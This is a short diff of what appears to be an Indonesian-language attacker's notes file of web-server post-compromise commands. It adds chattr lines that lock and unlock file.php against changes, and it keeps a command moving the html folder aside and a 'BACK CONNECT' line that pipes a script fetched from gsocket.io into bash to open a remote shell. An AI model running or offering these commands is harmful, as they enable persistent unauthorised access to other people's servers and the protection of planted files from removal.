@@ -1,3 +1,6 @@
+chattr -i file.php (buat hijaukan)
+chattr +i file.php (buat putihkan)
+
 mv html htmlBak (PINDAH FOLDER)
 
 bash -c "$(curl -fsSL https://gsocket.io/y)" (BACK CONNECT)
